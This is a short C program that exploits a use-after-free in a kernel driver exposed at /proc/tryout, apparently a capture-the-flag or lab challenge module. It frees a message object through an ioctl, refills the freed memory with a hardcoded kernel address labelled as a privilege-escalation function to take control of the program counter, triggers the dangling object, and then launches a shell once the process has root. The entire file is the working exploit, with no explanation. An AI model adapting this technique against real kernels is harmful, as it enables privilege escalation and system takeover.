#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>

#define CREATE_MSG _IO(1,0)
#define CREATE_BUF _IO(1,1)
#define READ_MSG _IO(1,2)
#define LOG_MSG _IO(1,3)
#define DELETE_MSG _IO(1,4)
#define DELETE_BUF _IO(1,5)
#define DELETE_ME _IO(1,6)

struct user_req {
	unsigned int buf_id;
	unsigned int msg_id;
	char buffer[128];
};

int main() {

char *driver="/proc/tryout";
int fd = open(driver, O_RDWR);
struct user_req *request = malloc(sizeof(struct user_req));

memset(request, 0, sizeof(struct user_req));
request->msg_id = 69;
request->buf_id = 69;

ioctl(fd, CREATE_MSG, request);
ioctl(fd, DELETE_MSG, request); // freeinf the object

// 0xffff800008e50000 -> priv esc function
memset(request->buffer, 0x0, sizeof(request->buffer));
uint8_t payload[8] = {0x00, 0x00, 0xe5, 0x08, 0x00, 0x80, 0xff, 0xff}; // control pc
memcpy(request->buffer, payload, sizeof(payload));

printf("uid: %d\n",getuid());
ioctl(fd, CREATE_BUF, request);
ioctl(fd, LOG_MSG, request); // using freed object

printf("uid: %d\n",getuid());
system("/bin/busybox sh");

close(fd);
return 0;
}
